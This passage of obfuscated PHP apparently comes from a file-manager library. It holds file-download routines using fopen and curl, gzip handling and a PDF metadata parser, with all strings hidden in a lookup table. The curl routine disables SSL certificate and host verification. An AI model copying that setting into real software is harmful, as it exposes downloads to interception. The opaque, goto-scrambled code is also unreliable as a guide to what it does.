@unlink($BâÀä•†ğ); @unlink($Eó¼Œ È„ˆ); return array($c“¶îÁÊÕö[1040] => !0, $c“¶îÁÊÕö[1042] => $c“¶îÁÊÕö[1524]); } if ($E›Öã™íõ[$c“¶îÁÊÕö[329]] != $dÂÆéŞŠ‡®) { $E›Öã™íõ = array($c“¶îÁÊÕö[329] => $dÂÆéŞŠ‡®); } goto b³´Ú©´‹Ú; DÖ²öÚ·—ö: } static function fileDownloadFopen($CÄâ‹ÙÜ£‰, $A¦‚Ê³«ç°, $e´³«ŸÑ‘‹ = 0) { $A¨½ƒËÏŸš =& $_SERVER[‡’¶øåüç˜]; @ini_set($A¨½ƒËÏŸš[1525], $A¨½ƒËÏŸš[1526]); $AÖ¥•¬›Ÿ‹ = $A¦‚Ê³«ç° . $A¨½ƒËÏŸš[1522]; set_timeout(); @unlink($AÖ¥•¬›Ÿ‹); if ($B¼£«‰Õ = @fopen($CÄâ‹ÙÜ£‰, $A¨½ƒËÏŸš[1527])) { goto dÏÖæÆÉ÷œ; C¦‡¦¶®Ô‹: return array($A¨½ƒËÏŸš[1040] => !0, $A¨½ƒËÏŸš[1042] => $A¨½ƒËÏŸš[702]); goto f±Ûğğ†Ğ˜; dÏÖæÆÉ÷œ: if (!($EÜÕ’Ù™Ş = @fopen($AÖ¥•¬›Ÿ‹, $A¨½ƒËÏŸš[1528]))) { return array($A¨½ƒËÏŸš[1040] => !1, $A¨½ƒËÏŸš[1042] => $A¨½ƒËÏŸš[1529]); } while (!feof($B¼£«‰Õ)) { if (!file_exists($AÖ¥•¬›Ÿ‹)) { fclose($EÜÕ’Ù™Ş); return array($A¨½ƒËÏŸš[1040] => !1, $A¨½ƒËÏŸš[1042] => $A¨½ƒËÏŸš[1530]); } clearstatcache(); if ($e´³«ŸÑ‘‹ > 0 && $e´³«ŸÑ‘‹ == filesize(iconv_system($AÖ¥•¬›Ÿ‹))) { break; } fwrite($EÜÕ’Ù™Ş, fread($B¼£«‰Õ, 1024 * 8), 1024 * 8); } fclose($EÜÕ’Ù™Ş); goto EÂ°àöÀê; EÂ°àöÀê: fclose($B¼£«‰Õ); self::checkGzip($AÖ¥•¬›Ÿ‹); if (!@rename($AÖ¥•¬›Ÿ‹, $A¦‚Ê³«ç°)) { usleep(round(rand(0, 1000) * 50)); @unlink($A¦‚Ê³«ç°); $c­ö¨¦Í‚´ = @rename($AÖ¥•¬›Ÿ‹, $A¦‚Ê³«ç°); if (!$c­ö¨¦Í‚´) { return array($A¨½ƒËÏŸš[1040] => !1, $A¨½ƒËÏŸš[1042] => $A¨½ƒËÏŸš[1531]); } } goto C¦‡¦¶®Ô‹; f±Ûğğ†Ğ˜: } else { return array($A¨½ƒËÏŸš[1040] => !1, $A¨½ƒËÏŸš[1042] => $A¨½ƒËÏŸš[1532]); } } static function fileDownloadCurl($A­æÆ’é©, $fƒ„­‰ÓòÉ, $cº–Åé¬Ä„ = false, $B§„‡”Î¿Ê = 0, $B ÷µƒÎË£ = 0) { goto e¨Æä¾ôá; Bµºà¢¢™¥: curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_SSL_VERIFYHOST, 0); goto aæéƒ¿÷æ; e¨Æä¾ôá: $eà¤°É‹Ó÷ =& $_SERVER[‡’¶øåüç˜]; $dä§›½«Á = $fƒ„­‰ÓòÉ . $eà¤°É‹Ó÷[1522]; set_timeout(); goto Bö°Š•ŠÈÍ; aæéƒ¿÷æ: curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_NOPROGRESS, !1); curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_PROGRESSFUNCTION, $eà¤°É‹Ó÷[1534]); curl_progress_start($fÔŒÇ÷Ø‰ˆ); goto d´’˜¦ë»å; A¨Ò¶íìÓô: curl_close($fÔŒÇ÷Ø‰ˆ); fclose($C…¦×ĞçŸë); $E¹‚Ñİ™é´ = filesize_64(iconv_system($dä§›½«Á)); goto F´ÅÁçµ; Dõ˜ï‚Œåâ: if ($cº–Åé¬Ä„) { curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_RANGE, $B§„‡”Î¿Ê . $eà¤°É‹Ó÷[721]); } curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_FILE, $C…¦×ĞçŸë); curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_REFERER, get_url_link($A­æÆ’é©)); goto Bµºà¢¢™¥; F´ÅÁçµ: if ($E¹‚Ñİ™é´ < $B ÷µƒÎË£ && $B ÷µƒÎË£ != 0) { return array($eà¤°É‹Ó÷[1040] => !1, $eà¤°É‹Ó÷[1042] => $eà¤°É‹Ó÷[1523]); } if ($a»Ï»’õ–Î && filesize_64($dä§›½«Á) != 0) { self::checkGzip($dä§›½«Á); if (!@rename($dä§›½«Á, $fƒ„­‰ÓòÉ)) { @unlink($fƒ„­‰ÓòÉ); $a»Ï»’õ–Î = @rename($dä§›½«Á, $fƒ„­‰ÓòÉ); if (!$a»Ï»’õ–Î) { return array($eà¤°É‹Ó÷[1040] => !1, $eà¤°É‹Ó÷[1042] => $eà¤°É‹Ó÷[1535]); } } return array($eà¤°É‹Ó÷[1040] => !0, $eà¤°É‹Ó÷[1042] => $eà¤°É‹Ó÷[702]); } return array($eà¤°É‹Ó÷[1040] => !1, $eà¤°É‹Ó÷[1042] => $eà¤°É‹Ó÷[1536]); goto aÒÓ¾è„‡; Bö°Š•ŠÈÍ: $C…¦×ĞçŸë = @fopen($dä§›½«Á, $eà¤°É‹Ó÷[984]); if (!$C…¦×ĞçŸë) { return array($eà¤°É‹Ó÷[1040] => !1, $eà¤°É‹Ó÷[1042] => $eà¤°É‹Ó÷[1533]); } $fÔŒÇ÷Ø‰ˆ = curl_init($A­æÆ’é©); goto Dõ˜ï‚Œåâ; d´’˜¦ë»å: curl_setopt($fÔŒÇ÷Ø‰ˆ, CURLOPT_USERAGENT, $eà¤°É‹Ó÷[1526]); $a»Ï»’õ–Î = curl_exec($fÔŒÇ÷Ø‰ˆ); curl_progress_end($fÔŒÇ÷Ø‰ˆ); goto A¨Ò¶íìÓô; aÒÓ¾è„‡: } static function checkGzip($f·È‹ïÛÆ–) { goto AºËÇÈµ½Ä; fØÅèÁê¸Í: file_put_contents($f·È‹ïÛÆ–, $b¤¸Éñïí¢); goto Dˆîá²ïˆì; AºËÇÈµ½Ä: $a¬İÁÌß = $_SERVER[‡’¶øåüç˜][1537]; $Dœ’º‚Í˜ = file_sub_str($f·È‹ïÛÆ–, 0, 2); if ($a¬İÁÌß != $Dœ’º‚Í˜) { return; } goto d×ÕØÛÒƒÉ; d×ÕØÛÒƒÉ: ob_start(); readgzfile($f·È‹ïÛÆ–); $b¤¸Éñïí¢ = ob_get_clean(); goto fØÅèÁê¸Í; Dˆîá²ïˆì: } } class FileParsePdf { public static function parse($fë–¨Å–‡) { goto ašƒõ–‚³œ; b”õ¾˜ò¯Ò: preg_match($Fô‘”õ«ØÊ, $b§áàÊ’ò[$b‡•ÏÒ…›[1540]], $C§‰»¨œÚ›); if (!$eê˜Ò§±Ÿ[$b‡•ÏÒ…›[162]] && count($C§‰»¨œÚ›) == 5) { $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[162]] = $C§‰»¨œÚ›[3]; $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[163]] = $C§‰»¨œÚ›[4]; } preg_match($b‡•ÏÒ…›[1543], $b§áàÊ’ò[$b‡•ÏÒ…›[1539]], $C§‰»¨œÚ›); goto fêãóé˜¬è; cß¨ø…²à…: $Fô‘”õ«ØÊ = $b‡•ÏÒ…›[1542]; preg_match($Fô‘”õ«ØÊ, $b§áàÊ’ò[$b‡•ÏÒ…›[1539]], $C§‰»¨œÚ›); if (!$eê˜Ò§±Ÿ[$b‡•ÏÒ…›[162]] && count($C§‰»¨œÚ›) == 5) { $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[162]] = $C§‰»¨œÚ›[3]; $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[163]] = $C§‰»¨œÚ›[4]; } goto b”õ¾˜ò¯Ò; B›Ï·ŠâôŸ: preg_match_all($Fô‘”õ«ØÊ, $b§áàÊ’ò[$b‡•ÏÒ…›[1539]], $C§‰»¨œÚ›); if ($C§‰»¨œÚ›[1] && $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[1544]] < $C§‰»¨œÚ›[1][0]) { $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[1544]] = $C§‰»¨œÚ›[1][0]; } preg_match_all($Fô‘”õ«ØÊ, $b§áàÊ’ò[$b‡•ÏÒ…›[1540]], $C§‰»¨œÚ›); goto cÈŠå¶”‚ù; D³×â¤İĞƒ: if ($DªÉİê¶–) { $BŞùÕŞ… = $DªÉİê¶–[$b‡•ÏÒ…›[1541]][$b‡•ÏÒ…›[1199]]; $eê˜Ò§±Ÿ = self::getObjectValue($b§áàÊ’ò, $DªÉİê¶–, $BŞùÕŞ…); } $eê˜Ò§±Ÿ = is_array($eê˜Ò§±Ÿ) ? $eê˜Ò§±Ÿ : array(); $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[162]] = 0; goto cß¨ø…²à…; F· ¶õÇÄù: $b§áàÊ’ò[$b‡•ÏÒ…›[1539]] = StreamWrapperIO::read($fë–¨Å–‡, 0, $E½«ƒ•öæ½); $b§áàÊ’ò[$b‡•ÏÒ…›[1540]] = StreamWrapperIO::read($fë–¨Å–‡, $b§áàÊ’ò[$b‡•ÏÒ…›[77]] - $E½«ƒ•öæ½, $E½«ƒ•öæ½); $DªÉİê¶– = self::decodeXref($b§áàÊ’ò); goto D³×â¤İĞƒ; ašƒõ–‚³œ: $b‡•ÏÒ…› =& $_SERVER[‡’¶øåüç˜]; $E½«ƒ•öæ½ = 32 * 1024; $b§áàÊ’ò = array($b‡•ÏÒ…›[785] => fopen($fë–¨Å–‡, $b‡•ÏÒ…›[1176]), $b‡•ÏÒ…›[75] => $fë–¨Å–‡, $b‡•ÏÒ…›[77] => filesize_64($fë–¨Å–‡), $b‡•ÏÒ…›[1538] => $E½«ƒ•öæ½); goto F· ¶õÇÄù; cÈŠå¶”‚ù: if ($C§‰»¨œÚ›[1] && $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[1544]] < $C§‰»¨œÚ›[1][0]) { $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[1544]] = $C§‰»¨œÚ›[1][0]; } $eê˜Ò§±Ÿ = self::parseInfoItem($eê˜Ò§±Ÿ); return $eê˜Ò§±Ÿ; goto fëˆåÜ´µ­; fêãóé˜¬è: if ($C§‰»¨œÚ›) { $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[1347]] = $C§‰»¨œÚ›[1]; } $eê˜Ò§±Ÿ[$b‡•ÏÒ…›[1544]] = 0; $Fô‘”õ«ØÊ = $b‡•ÏÒ…›[1545]; goto B›Ï·ŠâôŸ; fëˆåÜ´µ­: } private static function parseInfoItem($a‡›£É´) { $BˆëõĞµÒ« =& $_SERVER[‡’¶øåüç˜]; if (!$a‡›£É´) { return !1; } $eù§îŒ¨ = array($BˆëõĞµÒ«[1348] => array($BˆëõĞµÒ«[1546], $BˆëõĞµÒ«[33]), $BˆëõĞµÒ«[1547] => array($BˆëõĞµÒ«[1548], $BˆëõĞµÒ«[33]), $BˆëõĞµÒ«[191] => array($BˆëõĞµÒ«[1549], $BˆëõĞµÒ«[214]), $BˆëõĞµÒ«[107] => array($BˆëõĞµÒ«[1550], $BˆëõĞµÒ«[214]), $BˆëõĞµÒ«[1544] => array($BˆëõĞµÒ«[1544], $BˆëõĞµÒ«[280]), $BˆëõĞµÒ«[162] => array($BˆëõĞµÒ«[162], $BˆëõĞµÒ«[280]), $BˆëõĞµÒ«[163] => array($BˆëõĞµÒ«[163], $BˆëõĞµÒ«[280]), $BˆëõĞµÒ«[1551] => array($BˆëõĞµÒ«[1552], $BˆëõĞµÒ«[33]), $BˆëõĞµÒ«[1553] => array($BˆëõĞµÒ«[1554], $BˆëõĞµÒ«[33]), $BˆëõĞµÒ«[1555] => array($BˆëõĞµÒ«[1347], $BˆëõĞµÒ«[33])); $F®ˆÙñ¯‡ê = array(); foreach ($eù§îŒ¨ as $Dø›æ¤‘İ¬ => $e‡†ŒÁñù×) { if (!isset($a‡›£É´[$e‡†ŒÁñù×[0]])) { continue; } $A¸İ‚ƒ¾¤À = $a‡›£É´[$e‡†ŒÁñù×[0]]; if (!$A¸İ‚ƒ¾¤À || is_array($A¸İ‚ƒ¾¤À)) { continue; } switch ($e‡†ŒÁñù×[1]) { case $BˆëõĞµÒ«[280]: $A¸İ‚ƒ¾¤À = intval($A¸İ‚ƒ¾¤À); break; case $BˆëõĞµÒ«[214]: if (substr($A¸İ‚ƒ¾¤À, 0, 2) == $BˆëõĞµÒ«[1556]) { $A¸İ‚ƒ¾¤À = substr($A¸İ‚ƒ¾¤À, 2, 14); } if (strtotime($A¸İ‚ƒ¾¤À)) { $A¸İ‚ƒ¾¤À = date($BˆëõĞµÒ«[1557], strtotime($A¸İ‚ƒ¾¤À)); } break; } $F®ˆÙñ¯‡ê[$Dø›æ¤‘İ¬] = $A¸İ‚ƒ¾¤À; } return $F®ˆÙñ¯‡ê; } private static function decodeXref(&$A‚†îù’Š) { goto FÔî³±‡°Õ; FÔî³±‡°Õ: $FÎÚ£µ–Ãƒ =& $_SERVER[‡’¶øåüç˜]; $cÂô½ùÍ½è = $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1540]]; $A—ÎêÆµˆ = array($FÎÚ£µ–Ãƒ[1541] => array(), $FÎÚ£µ–Ãƒ[1558] => array()); goto fÖ– Çæ²Ó; fÖ– Çæ²Ó: $eÚÌã ŒÄ = $FÎÚ£µ–Ãƒ[1559]; if (!preg_match_all($eÚÌã ŒÄ, $cÂô½ùÍ½è, $A‰˜‹ŠÕáÜ, PREG_SET_ORDER, 0)) { return !1; } $eØÕÁ¤µÔ„ = intval($A‰˜‹ŠÕáÜ[0][1]); goto f·ñÔõ„Š; Eö”¬Ø­Ø–: if (preg_match($FÎÚ£µ–Ãƒ[1572], $b½Á˜»„¢í, $A‰˜‹ŠÕáÜ) > 0) { } return $A—ÎêÆµˆ; goto DºŸéá©‡ğ; a…ª¼ÂƒØ: foreach ($A‰˜‹ŠÕáÜ[3] as $aä¬ÚÚ…ïß => $dè‹åÔ™¶) { if ($A‰˜‹ŠÕáÜ[3][$aä¬ÚÚ…ïß] == $FÎÚ£µ–Ãƒ[1561]) { $Cêù˜­»Á = $AÚ‘àõÌè¥ . $FÎÚ£µ–Ãƒ[70] . intval($A‰˜‹ŠÕáÜ[2][$aä¬ÚÚ…ïß]); $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1558]][$Cêù˜­»Á] = intval($A‰˜‹ŠÕáÜ[1][$aä¬ÚÚ…ïß]); ++$AÚ‘àõÌè¥; } else { if ($A‰˜‹ŠÕáÜ[3][$aä¬ÚÚ…ïß] == $FÎÚ£µ–Ãƒ[1562]) { ++$AÚ‘àõÌè¥; } else { } } } if (preg_match_all($FÎÚ£µ–Ãƒ[1563], $cÂô½ùÍ½è, $A‰˜‹ŠÕáÜ)) { $eŞ¢Ô”ß‰Ù = $A‚†îù’Š[$FÎÚ£µ–Ãƒ[77]] - $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1538]]; foreach ($A‰˜‹ŠÕáÜ[0] as $aä¬ÚÚ…ïß => $F“ÃÀ¼¡¼Ä) { $dÄ›ÙÆ˜•¥ = $A‰˜‹ŠÕáÜ[1][$aä¬ÚÚ…ïß] . $FÎÚ£µ–Ãƒ[70] . $A‰˜‹ŠÕáÜ[2][$aä¬ÚÚ…ïß]; $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1558]][$dÄ›ÙÆ˜•¥] = strpos($cÂô½ùÍ½è, $F“ÃÀ¼¡¼Ä) + $eŞ¢Ô”ß‰Ù + 1; } } if (preg_match_all($FÎÚ£µ–Ãƒ[1564], $cÂô½ùÍ½è, $A‰˜‹ŠÕáÜ)) { $b½Á˜»„¢í = count($A‰˜‹ŠÕáÜ[1]) == 1 ? $A‰˜‹ŠÕáÜ[1][0] : $A‰˜‹ŠÕáÜ[1][1]; } else { $b½Á˜»„¢í = substr($cÂô½ùÍ½è, -1024 * 5); } goto eé§À˜ãÁ·; eé§À˜ãÁ·: if (preg_match($FÎÚ£µ–Ãƒ[1565], $b½Á˜»„¢í, $A‰˜‹ŠÕáÜ) > 0) { $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[77]] = intval($A‰˜‹ŠÕáÜ[1]); } if (preg_match($FÎÚ£µ–Ãƒ[1566], $b½Á˜»„¢í, $A‰˜‹ŠÕáÜ) > 0) { $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[1567]] = intval($A‰˜‹ŠÕáÜ[1]) . $FÎÚ£µ–Ãƒ[70] . intval($A‰˜‹ŠÕáÜ[2]); } if (preg_match($FÎÚ£µ–Ãƒ[1568], $b½Á˜»„¢í, $A‰˜‹ŠÕáÜ) > 0) { $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[1569]] = intval($A‰˜‹ŠÕáÜ[1]) . $FÎÚ£µ–Ãƒ[70] . intval($A‰˜‹ŠÕáÜ[2]); } goto D˜Îö•èÚ; D˜Îö•èÚ: if (preg_match($FÎÚ£µ–Ãƒ[1570], $b½Á˜»„¢í, $A‰˜‹ŠÕáÜ) > 0) { $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[1199]] = intval($A‰˜‹ŠÕáÜ[1]) . $FÎÚ£µ–Ãƒ[70] . intval($A‰˜‹ŠÕáÜ[2]); } if (preg_match($FÎÚ£µ–Ãƒ[1571], $b½Á˜»„¢í, $A‰˜‹ŠÕáÜ) > 0) { $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[371]] = array(); $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[371]][0] = $A‰˜‹ŠÕáÜ[1]; $A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[371]][1] = $A‰˜‹ŠÕáÜ[2]; } if (!$A—ÎêÆµˆ[$FÎÚ£µ–Ãƒ[1541]][$FÎÚ£µ–Ãƒ[1199]]) { return !1; } goto Eö”¬Ø­Ø–; f·ñÔõ„Š: if ($A‚†îù’Š[$FÎÚ£µ–Ãƒ[77]] - $eØÕÁ¤µÔ„ > $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1538]]) { $a‹‚Ú¸ÍÂ‡ = 4 * $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1538]]; $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1538]] = $a‹‚Ú¸ÍÂ‡; $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1539]] = StreamWrapperIO::read($A‚†îù’Š[$FÎÚ£µ–Ãƒ[75]], 0, $a‹‚Ú¸ÍÂ‡); $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1540]] = StreamWrapperIO::read($A‚†îù’Š[$FÎÚ£µ–Ãƒ[75]], $A‚†îù’Š[$FÎÚ£µ–Ãƒ[77]] - $a‹‚Ú¸ÍÂ‡, $a‹‚Ú¸ÍÂ‡); $cÂô½ùÍ½è = $A‚†îù’Š[$FÎÚ£µ–Ãƒ[1540]]; } $AÚ‘àõÌè¥ = 0; preg_match_all($FÎÚ£µ–Ãƒ[1560], $cÂô½ùÍ½è, $A‰˜‹ŠÕáÜ); goto a…ª¼ÂƒØ; DºŸéá©‡ğ: } private static function getObjectValue($B»Í¾³Ò± , $D‡òòÀËÍÖ, $fâÈœ Êˆ¢) { goto Bƒ±†¿í¨; aã¦£¹ó’§: if (!is_array($AŞ•˜¤”ßÆ[1])) { return array(); } $dĞòï ª«ˆ = array(); for ($bïÄ£»ÓÚ = 0; $bïÄ£»ÓÚ < count($AŞ•˜¤”ßÆ[1]); $bïÄ£»ÓÚ += 2) { $eµ¦÷²ºğØ = $AŞ•˜¤”ßÆ[1][$bïÄ£»ÓÚ]; $D²àøñô¢ù = $AŞ•˜¤”ßÆ[1][$bïÄ£»ÓÚ + 1]; if (count($eµ¦÷²ºğØ) == 3 && $eµ¦÷²ºğØ[0] == $eš÷ˆŞ¿‡[8]) { $dÇÆÚ‡ƒÈæ = !1; if ($D²àøñô¢ù[0] == $eš÷ˆŞ¿‡[1573]) { $D²àøñô¢ù = self::getObject($B»Í¾³Ò± , $D‡òòÀËÍÖ[$eš÷ˆŞ¿‡[1558]][$D²àøñô¢ù[1]]); } $dÇÆÚ‡ƒÈæ = $D²àøñô¢ù[1]; if ($dÇÆÚ‡ƒÈæ === !1) { continue; } if (is_string($dÇÆÚ‡ƒÈæ)) { $dÇÆÚ‡ƒÈæ = self::decodeStr($dÇÆÚ‡ƒÈæ); } $dĞòï ª«ˆ[$eµ¦÷²ºğØ[1]] = $dÇÆÚ‡ƒÈæ; } } goto BÜ¬ìµˆã; BÜ¬ìµˆã: return $dĞòï ª«ˆ; goto C‰ĞÙÅŸ¨; Bƒ±†¿í¨: $eš÷ˆŞ¿‡ =& $_SERVER[‡’¶øåüç˜]; $AŞ•˜¤”ßÆ = self::getObject($B»Í¾³Ò± , $D‡òòÀËÍÖ[$eš÷ˆŞ¿‡[1558]][$fâÈœ Êˆ¢]); if (is_string($AŞ•˜¤”ßÆ[1])) { return $AŞ•˜¤”ßÆ[1]; } goto aã¦£¹ó’§; C‰ĞÙÅŸ¨: } private static function getObject($FÒ óï…›ª, $EçŒ¾©é±Ğ) { $DŸˆŠöê¯ß = self::getObjectItem($FÒ óï…›ª, $EçŒ¾©é±Ğ); $DŸˆŠöê¯ß = self::getObjectItem($FÒ óï…›ª, $DŸˆŠöê¯ß[2]); return $DŸˆŠöê¯ß; } private static function getObjectItem($a¿íÖ¦¸Š¼, $cÆÛÎ‡¾«) { goto eâïÎùº«®; Bª¸ÒÍâŸÎ: $C‡¡çƒÏ˜¿ = self::getRawObject($d±Ñ¦ ˜³, $FãÙ²°ï¤Œ); if ($cÆÛÎ‡¾« >= $dŠÓÓˆÎò¾) { $C‡¡çƒÏ˜¿[2] = $C‡¡çƒÏ˜¿[2] + $dŠÓÓˆÎò¾; } else { if ($cÆÛÎ‡¾« > $F„£×àŠæ && $cÆÛÎ‡¾« <= $dŠÓÓˆÎò¾) { $C‡¡çƒÏ˜¿[2] = $C‡¡çƒÏ˜¿[2] + $cÆÛÎ‡¾«; } } return $C‡¡çƒÏ˜¿; goto bƒĞâÅ±‚à; a¦ŠĞ—éÂ¦: $FãÙ²°ï¤Œ = $cÆÛÎ‡¾« >= $dŠÓÓˆÎò¾ ? $cÆÛÎ‡¾« - $dŠÓÓˆÎò¾ : $cÆÛÎ‡¾«; $d±Ñ¦ ˜³ = $cÆÛÎ‡¾« >= $dŠÓÓˆÎò¾ ? $a¿íÖ¦¸Š¼[$fŸÎã‰õ‰Ú[1540]] : $a¿íÖ¦¸Š¼[$fŸÎã‰õ‰Ú[1539]]; if ($cÆÛÎ‡¾« > $F„£×àŠæ && $cÆÛÎ‡¾« <= $dŠÓÓˆÎò¾) { $FãÙ²°ï¤Œ = 0; $d±Ñ¦ ˜³ = StreamWrapperIO::read($a¿íÖ¦¸Š¼[$fŸÎã‰õ‰Ú[75]], $cÆÛÎ‡¾«, $F„£×àŠæ); } goto Bª¸ÒÍâŸÎ; eâïÎùº«®: $fŸÎã‰õ‰Ú =& $_SERVER[‡’¶øåüç˜]; $F„£×àŠæ = $a¿íÖ¦¸Š¼[$fŸÎã‰õ‰Ú[1538]]; $dŠÓÓˆÎò¾ = $a¿íÖ¦¸Š¼[$fŸÎã‰õ‰Ú[77]] - $F„£×àŠæ; goto a¦ŠĞ—éÂ¦; bƒĞâÅ±‚à: } private static function decodeStr($f¯Í¡¢Ó†‹) { goto bŒ¶íŒµíß; fÑÓ Ò³äŸ: return $f¯Í¡¢Ó†‹; goto b™ø¶©–Ò—; EÒÅ¾âª÷: $f¯Í¡¢Ó†‹ = $Cİˆ†Ï©Ë™[33]; foreach ($AÍòÎóÖò³ as $f±’á¯¹¼×) { if (preg_match($Cİˆ†Ï©Ë™[1588], $f±’á¯¹¼×) && !1 === stripos($f±’á¯¹¼×, $Cİˆ†Ï©Ë™[1589])) { $f±’á¯¹¼× = preg_replace($Cİˆ†Ï©Ë™[1590], $Cİˆ†Ï©Ë™[33], $f±’á¯¹¼×); $f±’á¯¹¼× = trim($f±’á¯¹¼×, $Cİˆ†Ï©Ë™[929]); $f±’á¯¹¼× = pack($Cİˆ†Ï©Ë™[1591], $f±’á¯¹¼×); $f¯Í¡¢Ó†‹ .= $f±’á¯¹¼×; } else { $f¯Í¡¢Ó†‹ .= $f±’á¯¹¼×; } } if (preg_match($Cİˆ†Ï©Ë™[1592], $f¯Í¡¢Ó†‹)) { $bçÛßÕø× = substr($f¯Í¡¢Ó†‹, 2); $f¯Í¡¢Ó†‹ = $Cİˆ†Ï©Ë™[33]; $a¢ÁŠªÅµœ = strlen($bçÛßÕø×); for ($CƒŠÌì±ÒÓ = 0; $CƒŠÌì±ÒÓ < $a¢ÁŠªÅµœ; $CƒŠÌì±ÒÓ += 2) { $e²ø™Êó… = hexdec(bin2hex(substr($bçÛßÕø×, $CƒŠÌì±ÒÓ, 2))); $f¯Í¡¢Ó†‹ .= mb_convert_encoding($Cİˆ†Ï©Ë™[1593] . intval($e²ø™Êó…) . $Cİˆ†Ï©Ë™[67], $Cİˆ†Ï©Ë™[1594], $Cİˆ†Ï©Ë™[1595]); } } goto fÑÓ Ò³äŸ; fëİÃİŞ¼Ø: $f¯Í¡¢Ó†‹ = $Cİˆ†Ï©Ë™[33]; foreach ($AÍòÎóÖò³ as $f±’á¯¹¼×) { if (preg_match($Cİˆ†Ï©Ë™[1585], $f±’á¯¹¼×)) { $f¯Í¡¢Ó†‹ .= \chr(hexdec(trim($f±’á¯¹¼×, $Cİˆ†Ï©Ë™[1586]))); } else { $f¯Í¡¢Ó†‹ .= $f±’á¯¹¼×; } } $AÍòÎóÖò³ = preg_split($Cİˆ†Ï©Ë™[1587], $f¯Í¡¢Ó†‹, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto EÒÅ¾âª÷; CëíÙ„‹ò§: $f¯Í¡¢Ó†‹ = $Cİˆ†Ï©Ë™[33]; foreach ($AÍòÎóÖò³ as $f±’á¯¹¼×) { if (preg_match($Cİˆ†Ï©Ë™[1583], $f±’á¯¹¼×)) { $f¯Í¡¢Ó†‹ .= \chr(octdec(trim($f±’á¯¹¼×, $Cİˆ†Ï©Ë™[93]))); } else { $f¯Í¡¢Ó†‹ .= $f±’á¯¹¼×; } } $AÍòÎóÖò³ = preg_split($Cİˆ†Ï©Ë™[1584], $f¯Í¡¢Ó†‹, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fëİÃİŞ¼Ø; bŒ¶íŒµíß: $Cİˆ†Ï©Ë™ =& $_SERVER[‡’¶øåüç˜]; $f¯Í¡¢Ó†‹ = str_replace(array($Cİˆ†Ï©Ë™[1574], $Cİˆ†Ï©Ë™[1575], $Cİˆ†Ï©Ë™[1576], $Cİˆ†Ï©Ë™[1577], $Cİˆ†Ï©Ë™[1578], $Cİˆ†Ï©Ë™[1579], $Cİˆ†Ï©Ë™[1580], $Cİˆ†Ï©Ë™[1581]), array($Cİˆ†Ï©Ë™[93], $Cİˆ†Ï©Ë™[50], $Cİˆ†Ï©Ë™[8], $Cİˆ†Ï©Ë™[252], $Cİˆ†Ï©Ë™[822], $Cİˆ†Ï©Ë™[221], $Cİˆ†Ï©Ë™[996], $Cİˆ†Ï©Ë™[334]), $f¯Í¡¢Ó†‹); $AÍòÎóÖò³ = preg_split($Cİˆ†Ï©Ë™[1582], $f¯Í¡¢Ó†‹, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CëíÙ„‹ò§; b™ø¶©–Ò—: } private static function getRawObject($fŠ°½Åº«, $e²Ááºà® = 0) { goto bøÎ³óßÊ; bøÎ³óßÊ: $F¸ïÏâ“Ú¾ =& $_SERVER[‡’¶øåüç˜]; $cßÅ––á‚´ = $F¸ïÏâ“Ú¾[33]; $d“„‡Ïõ¹ = $F¸ïÏâ“Ú¾[33]; goto cŠÎ¦«Ôò; a¿¿öã¤…±: return array($cßÅ––á‚´, $d“„‡Ïõ¹, $e²Ááºà®); goto eö´‘°÷Àò; cŠÎ¦«Ôò: $e²Ááºà® += strspn($fŠ°½Åº«, $F¸ïÏâ“Ú¾[1596], $e²Ááºà®); $Cƒ±…ÆÁ‚ = $fŠ°½Åº«[$e²Ááºà®]; switch ($Cƒ±…ÆÁ‚) { case $F¸ïÏâ“Ú¾[1597]: $C„ÄÜ° = strcspn($fŠ°½Åº«, $F¸ïÏâ“Ú¾[1598], $e²Ááºà®); if ($C„ÄÜ° > 0) { $e²Ááºà® += $C„ÄÜ°; return self::getRawObject($fŠ°½Åº«, $e²Ááºà®); } break; case $F¸ïÏâ“Ú¾[8]: $cßÅ––á‚´ = $Cƒ±…ÆÁ‚; ++$e²Ááºà®; $c¥öÍõÖÄœ = preg_match($F¸ïÏâ“Ú¾[1599], 